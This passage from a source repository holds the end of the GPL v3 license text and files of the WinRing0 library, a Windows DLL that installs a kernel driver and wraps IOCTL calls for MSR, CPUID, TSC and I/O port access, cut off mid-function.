EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    {one line to give the program's name and a brief idea of what it does.}
    Copyright (C) {year}  {name of author}

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    {project}  Copyright (C) {year}  {fullname}
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<http://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<http://www.gnu.org/philosophy/why-not-lgpl.html>.

```

`source/WormholeDrivers/WINRING0/README.md`:

```md
# WinRing0
Windows Ring0 Access

###File Directory

>dll
* driver source

>drv
* driver normal interface

##Description
Allow user application to access ring0 level resource

* access cpu msr register
* read/write memory directly
* io pci device
* etc...

```

`source/WormholeDrivers/WINRING0/dll/Driver.cpp`:

```cpp
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include "stdafx.h"
#include "Driver.h"
#include <tchar.h>
#include "OlsDll.h"

//-----------------------------------------------------------------------------
//
// Global
//
//-----------------------------------------------------------------------------

extern HANDLE gHandle;

//-----------------------------------------------------------------------------
//
// Prototypes
//
//-----------------------------------------------------------------------------

static BOOL InstallDriver(SC_HANDLE hSCManager, LPCTSTR DriverId, LPCTSTR DriverPath);
static BOOL RemoveDriver(SC_HANDLE hSCManager, LPCTSTR DriverId);
static BOOL StartDriver(SC_HANDLE hSCManager, LPCTSTR DriverId);
static BOOL StopDriver(SC_HANDLE hSCManager, LPCTSTR DriverId);
static BOOL SystemInstallDriver(SC_HANDLE hSCManager, LPCTSTR DriverId, LPCTSTR DriverPath);
static BOOL IsSystemInstallDriver(SC_HANDLE hSCManager, LPCTSTR DriverId, LPCTSTR DriverPath);

//-----------------------------------------------------------------------------
//
// Manage Driver
//
//-----------------------------------------------------------------------------

BOOL ManageDriver(LPCTSTR DriverId, LPCTSTR DriverPath, USHORT Function)
{
	SC_HANDLE	hSCManager = NULL;
	BOOL		rCode = FALSE;
	DWORD		error = NO_ERROR;

	if(DriverId == NULL || DriverPath == NULL)
	{
		return FALSE;
	}
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if(hSCManager == NULL)
	{
        return FALSE;
    }

    switch(Function)
	{
	case OLS_DRIVER_INSTALL:
		if(InstallDriver(hSCManager, DriverId, DriverPath))
		{
			rCode = StartDriver(hSCManager, DriverId);
		}
		break;
	case OLS_DRIVER_REMOVE:
		if(! IsSystemInstallDriver(hSCManager, DriverId, DriverPath))
		{
			StopDriver(hSCManager, DriverId);
			rCode = RemoveDriver(hSCManager, DriverId);
		}
		break;
	case OLS_DRIVER_SYSTEM_INSTALL:
		if(IsSystemInstallDriver(hSCManager, DriverId, DriverPath))
		{
			rCode = TRUE;
		}
		else
		{
			if(! OpenDriver())
			{
				StopDriver(hSCManager, DriverId);
				RemoveDriver(hSCManager, DriverId);
				if(InstallDriver(hSCManager, DriverId, DriverPath))
				{
					StartDriver(hSCManager, DriverId);
				}
				OpenDriver();
			}
			rCode = SystemInstallDriver(hSCManager, DriverId, DriverPath);
		}
		break;
	case OLS_DRIVER_SYSTEM_UNINSTALL:
		if(! IsSystemInstallDriver(hSCManager, DriverId, DriverPath))
		{
			rCode = TRUE;
		}
		else
		{
			if(gHandle != INVALID_HANDLE_VALUE)
			{
				CloseHandle(gHandle);
				gHandle = INVALID_HANDLE_VALUE;
			}

			if(StopDriver(hSCManager, DriverId))
			{
				rCode = RemoveDriver(hSCManager, DriverId);
			}
		}
		break;
	default:
		rCode = FALSE;
		break;
    }

	if(hSCManager != NULL)
	{
        CloseServiceHandle(hSCManager);
    }

	return rCode;
}

//-----------------------------------------------------------------------------
//
// Install Driver
//
//-----------------------------------------------------------------------------

BOOL InstallDriver(SC_HANDLE hSCManager, LPCTSTR DriverId, LPCTSTR DriverPath)
{
	SC_HANDLE	hService = NULL;
    BOOL        rCode = FALSE;
	DWORD		error = NO_ERROR;

	hService = CreateService(hSCManager,
							DriverId,
							DriverId,
							SERVICE_ALL_ACCESS,
							SERVICE_KERNEL_DRIVER,
							SERVICE_DEMAND_START,
							SERVICE_ERROR_NORMAL,
							DriverPath,
							NULL,
							NULL,
							NULL,
							NULL,
							NULL
							);

    if(hService == NULL)
	{
		error = GetLastError();
		if(error == ERROR_SERVICE_EXISTS)
		{
			rCode = TRUE;
        }
    }
	else
	{
		rCode = TRUE;
        CloseServiceHandle(hService);
    }

    return rCode;
}

//-----------------------------------------------------------------------------
//
// System Install Driver
//
//-----------------------------------------------------------------------------

BOOL SystemInstallDriver(SC_HANDLE hSCManager, LPCTSTR DriverId, LPCTSTR DriverPath)
{
	SC_HANDLE	hService = NULL;
	BOOL		rCode = FALSE;
	
	hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);

	if(hService != NULL)
	{
		rCode = ChangeServiceConfig(hService,
							SERVICE_KERNEL_DRIVER,
							SERVICE_AUTO_START,
							SERVICE_ERROR_NORMAL,
							DriverPath,
							NULL,
							NULL,
							NULL,
							NULL,
							NULL,
							NULL
							);
		CloseServiceHandle(hService);
	}

	return rCode;
}

//-----------------------------------------------------------------------------
//
// Remove Driver
//
//-----------------------------------------------------------------------------

BOOL RemoveDriver(SC_HANDLE hSCManager, LPCTSTR DriverId)
{
    SC_HANDLE   hService = NULL;
    BOOL        rCode = FALSE;

    hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);
    if(hService == NULL)
	{
		rCode = TRUE;
	}
	else
	{
		rCode = DeleteService(hService);
		CloseServiceHandle(hService);
	}

	return rCode;
}

//-----------------------------------------------------------------------------
//
// Start Driver
//
//-----------------------------------------------------------------------------

BOOL StartDriver(SC_HANDLE hSCManager, LPCTSTR DriverId)
{
	SC_HANDLE	hService = NULL;
	BOOL		rCode = FALSE;
	DWORD		error = NO_ERROR;

	hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);

    if(hService != NULL)
	{
		if(! StartService(hService, 0, NULL))
		{
			error = GetLastError();
			if(error == ERROR_SERVICE_ALREADY_RUNNING)
			{
				rCode = TRUE;
			}
		}
		else
		{
			rCode = TRUE;
		}
		CloseServiceHandle(hService);
	}

	return rCode;
}

//-----------------------------------------------------------------------------
//
// Stop Driver
//
//-----------------------------------------------------------------------------

BOOL StopDriver(SC_HANDLE hSCManager, LPCTSTR DriverId)
{
	SC_HANDLE		hService = NULL;
	BOOL			rCode = FALSE;
	SERVICE_STATUS	serviceStatus;
	DWORD		error = NO_ERROR;

	hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);

    if(hService != NULL)
	{
		rCode = ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);
		error = GetLastError();
        CloseServiceHandle(hService);
	}

    return rCode;
}

//-----------------------------------------------------------------------------
//
// IsSystemInstallDriver
//
//-----------------------------------------------------------------------------

BOOL IsSystemInstallDriver(SC_HANDLE hSCManager, LPCTSTR DriverId, LPCTSTR DriverPath)
{
	SC_HANDLE				hService = NULL;
	BOOL					rCode = FALSE;
	DWORD					dwSize;
	LPQUERY_SERVICE_CONFIG	lpServiceConfig;

    hService = OpenService(hSCManager, DriverId, SERVICE_ALL_ACCESS);

	if(hService != NULL)
	{
		QueryServiceConfig(hService, NULL, 0, &dwSize);
		lpServiceConfig = (LPQUERY_SERVICE_CONFIG)HeapAlloc(GetProcessHeap(), 
															HEAP_ZERO_MEMORY, dwSize);
		QueryServiceConfig(hService, lpServiceConfig, dwSize, &dwSize);

		if(lpServiceConfig->dwStartType == SERVICE_AUTO_START)
		{
			rCode = TRUE;
		}

		CloseServiceHandle(hService);

		HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, lpServiceConfig);
	}
	
	return rCode;
}
```

`source/WormholeDrivers/WINRING0/dll/Driver.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#pragma once

#define OLS_DRIVER_INSTALL			1
#define OLS_DRIVER_REMOVE			2
#define OLS_DRIVER_SYSTEM_INSTALL	3
#define	OLS_DRIVER_SYSTEM_UNINSTALL	4

BOOL ManageDriver(LPCTSTR DriverId, LPCTSTR DriverPath, USHORT Function);
```

`source/WormholeDrivers/WINRING0/dll/OlsApi.cpp`:

```cpp
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2009 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include "stdafx.h"
#include <tchar.h>
#include <winioctl.h>
#include <stddef.h>
#include <malloc.h>
#include <intrin.h>
#include "OlsDll.h"
#include "OlsApi.h"
#include "OlsDef.h"
#include "Driver.h"
#include "OlsIoctl.h"

//-----------------------------------------------------------------------------
//
// Defines
//
//-----------------------------------------------------------------------------

const BYTE gPciNumberOfDevice =	32;
const BYTE gPciNumberOfFunction = 8;

//-----------------------------------------------------------------------------
//
// Global
//
//-----------------------------------------------------------------------------

BYTE gPciMaxNumberOfBus = 255;

extern HANDLE gHandle;

extern BOOL gIsNT;
extern BOOL gIsCpuid;
extern BOOL gIsMsr;
extern BOOL gIsTsc;
extern BOOL gInitDll;

extern DWORD gDllStatus;
extern DWORD gDriverType;
extern TCHAR gDriverPath[MAX_PATH];

//-----------------------------------------------------------------------------
//
// DLL
//
//-----------------------------------------------------------------------------

DWORD WINAPI GetDllStatus()
{
	if(gDllStatus == OLS_DLL_NO_ERROR
	&& gDriverType >= OLS_DRIVER_TYPE_WIN_NT
	&& GetDriverVersion(NULL, NULL, NULL, NULL) == 0
	)
	{
		gDllStatus = OLS_DLL_DRIVER_UNLOADED;
	}

	return gDllStatus;
}

DWORD WINAPI GetDllVersion(PBYTE major, PBYTE minor, PBYTE revision, PBYTE release)
{
	if(major != NULL && minor != NULL && revision != NULL && release != NULL)
	{
		*major = OLS_MAJOR_VERSION;
		*minor = OLS_MINOR_VERSION;
		*revision = OLS_REVISION;
		*release = OLS_RELESE;
	}

	return OLS_VERSION;
}

DWORD WINAPI GetDriverVersion(PBYTE major, PBYTE minor, PBYTE revision, PBYTE release)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	value = 0;

	result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_GET_DRIVER_VERSION,
                        NULL,     
                        0,
                        &value,
                        sizeof(value),
                        &returnedLength,
                        NULL
                        );

	if(result)
	{
		if(major != NULL && minor != NULL && revision != NULL && release != NULL)
		{
			*major = (BYTE)((value >> 24) & 0xFF);
			*minor = (BYTE)((value >> 16) & 0xFF);
			*revision = (BYTE)((value >> 8) & 0xFF);
			*release = (BYTE)((value) & 0xFF);		
		}
	}
	else
	{
		value = 0;
	}
	
	return value;
}

DWORD WINAPI GetDriverType()
{
	return gDriverType;
}

//-----------------------------------------------------------------------------
//
// CPU
//
//-----------------------------------------------------------------------------

BOOL WINAPI IsCpuid()
{
	return gIsCpuid;
}

BOOL WINAPI IsMsr()
{
	return gIsMsr;
}

BOOL WINAPI IsTsc()
{
	return gIsTsc;
}

BOOL WINAPI Rdmsr(DWORD index, PDWORD eax, PDWORD edx)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if(eax == NULL || edx == NULL || gIsMsr == FALSE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
 	BOOL	result = FALSE;
	BYTE	outBuf[8] = {0};

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_READ_MSR,
					&index,
					sizeof(index),
					&outBuf,
					sizeof(outBuf),
					&returnedLength,
					NULL
					);

	if(result)
	{
		memcpy(eax, outBuf, 4);
		memcpy(edx, outBuf + 4, 4);
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI RdmsrTx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Rdmsr(index, eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI RdmsrPx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Rdmsr(index, eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Wrmsr(DWORD index, DWORD eax, DWORD edx)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if(gIsMsr == FALSE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
 	BOOL	result = FALSE;
	DWORD	outBuf;
	OLS_WRITE_MSR_INPUT inBuf;

	inBuf.Register = index;
	inBuf.Value.HighPart = edx;
	inBuf.Value.LowPart = eax;

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_WRITE_MSR,
					&inBuf,
					sizeof(inBuf),
					&outBuf,
					sizeof(outBuf),
					&returnedLength,
					NULL
					);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI WrmsrTx(DWORD index, DWORD eax, DWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Wrmsr(index, eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI WrmsrPx(DWORD index, DWORD eax, DWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Wrmsr(index, eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Rdpmc(DWORD index, PDWORD eax, PDWORD edx)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	if(eax == NULL || edx == NULL)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	BYTE	outBuf[8] = {0};

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_READ_PMC,
					&index,	
					sizeof(index),
					&outBuf,
					sizeof(outBuf),
					&returnedLength,
					NULL
					);

	if(result)
	{
		memcpy(eax, outBuf, 4);
		memcpy(edx, outBuf + 4, 4);
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI RdpmcTx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Rdpmc(index, eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI RdpmcPx(DWORD index, PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Rdpmc(index, eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Cpuid(DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx)
{
	if(eax == NULL || ebx == NULL || ecx == NULL || edx == NULL || gIsCpuid == FALSE)
	{
		return FALSE;
	}

	int info[4];
	__cpuid(info, index);
	*eax = info[0];
	*ebx = info[1];
	*ecx = info[2];
	*edx = info[3];

	return TRUE;
}

BOOL WINAPI CpuidTx(DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Cpuid(index, eax, ebx, ecx, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI CpuidPx(DWORD index, PDWORD eax, PDWORD ebx, PDWORD ecx, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Cpuid(index, eax, ebx, ecx, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}


BOOL WINAPI Rdtsc(PDWORD eax, PDWORD edx)
{
	if(eax == NULL || edx == NULL || gIsTsc == FALSE)
	{
		return FALSE;
	}

	ULONGLONG value = 0;
	
	value = __rdtsc();
	*eax = (DWORD)((value >>  0) & 0xFFFFFFFF);
	*edx = (DWORD)((value >> 32) & 0xFFFFFFFF);

	return TRUE;
}

BOOL WINAPI RdtscTx(PDWORD eax, PDWORD edx, DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Rdtsc(eax, edx);

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI RdtscPx(PDWORD eax, PDWORD edx, DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Rdtsc(eax, edx);

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

BOOL WINAPI Hlt()
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
 	BOOL	result = FALSE;

	result = DeviceIoControl(
					gHandle,
					IOCTL_OLS_HALT,	
					NULL,
					0,
					NULL,
					0,
					&returnedLength,
					NULL
					);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI HltTx(DWORD_PTR threadAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	mask = 0;
	HANDLE		hThread = NULL;

	if(gIsNT)
	{
		hThread = GetCurrentThread();
		mask = SetThreadAffinityMask(hThread, threadAffinityMask);
		if(mask == 0)
		{
			return FALSE;
		}
	}

	result = Hlt();

	if(gIsNT)
	{
		SetThreadAffinityMask(hThread, mask);
	}

	return result;
}

BOOL WINAPI HltPx(DWORD_PTR processAffinityMask)
{
	BOOL		result = FALSE;
	DWORD_PTR	processMask = 0;
	DWORD_PTR	systemMask = 0;
	HANDLE		hProcess = NULL;

	if(gIsNT)
	{
		hProcess = GetCurrentProcess();
		GetProcessAffinityMask(hProcess, &processMask, &systemMask);
		if(! SetProcessAffinityMask(hProcess, processAffinityMask))
		{
			return FALSE;
		}
	}

	result = Hlt();

	if(gIsNT)
	{
		SetProcessAffinityMask(hProcess, processMask);
	}

	return result;
}

//-----------------------------------------------------------------------------
//
// I/O
//
//-----------------------------------------------------------------------------

//-----------------------------------------------------------------------------
// I/O Read (No Error Check)
//-----------------------------------------------------------------------------

BYTE WINAPI ReadIoPortByte(WORD port)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	value = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_BYTE,
						&port,
						sizeof(port),
						&value,
						sizeof(value),
						&returnedLength,
						NULL
						);

	return (BYTE)value;
}

WORD WINAPI ReadIoPortWord(WORD port)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	value = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_WORD,
						&port,     
						sizeof(port),
						&value,
						sizeof(value),
						&returnedLength,
						NULL
						);

	return value;
}

DWORD WINAPI ReadIoPortDword(WORD port)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	port4 = port;
	DWORD	value = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_DWORD,
						&port4,     
						sizeof(port4),	// required 4 bytes
						&value,
						sizeof(value),
						&returnedLength,
						NULL
						);

	return value;
}

//-----------------------------------------------------------------------------
// I/O Read (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI ReadIoPortByteEx(WORD port, PBYTE value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	val = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_BYTE,
						&port,
						sizeof(port),
						&val,
						sizeof(val),
						&returnedLength,
						NULL
						);

	if(result)
	{
		*value = (BYTE)val;
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI ReadIoPortWordEx(WORD port, PWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	WORD	val = 0;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_WORD,
						&port,     
						sizeof(port),
						&val,
						sizeof(val),
						&returnedLength,
						NULL
						);

	if(result)
	{
		*value = val;
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI ReadIoPortDwordEx(WORD port, PDWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	val = port;

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_READ_IO_PORT_DWORD,
						&val,     
						sizeof(val),	// required 4 bytes
						&val,
						sizeof(val),
						&returnedLength,
						NULL
						);

	if(result)
	{
		*value = val;
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
// I/O Write (No Error Check)
//-----------------------------------------------------------------------------

VOID WINAPI WriteIoPortByte(WORD port, BYTE value)
{
	if(gHandle == INVALID_HANDLE_VALUE){return ;}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.CharData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.CharData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_BYTE,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
}

VOID WINAPI WriteIoPortWord(WORD port, WORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE){return ;}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.ShortData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.ShortData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_WORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
}

VOID WINAPI WriteIoPortDword(WORD port, DWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE){return ;}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.LongData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.LongData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_DWORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
}

//-----------------------------------------------------------------------------
// I/O Write (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI WriteIoPortByteEx(WORD port, BYTE value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	DWORD   length = 0;
	BOOL	result = FALSE;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.CharData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.CharData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_BYTE,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI WriteIoPortWordEx(WORD port, WORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	DWORD   length = 0;
	BOOL	result = FALSE;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.ShortData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
						 sizeof(inBuf.ShortData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_WORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL WINAPI WriteIoPortDwordEx(WORD port, DWORD value)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD   length = 0;
    OLS_WRITE_IO_PORT_INPUT inBuf;

	inBuf.LongData = value;
	inBuf.PortNumber = port;
	length = offsetof(OLS_WRITE_IO_PORT_INPUT, CharData) +
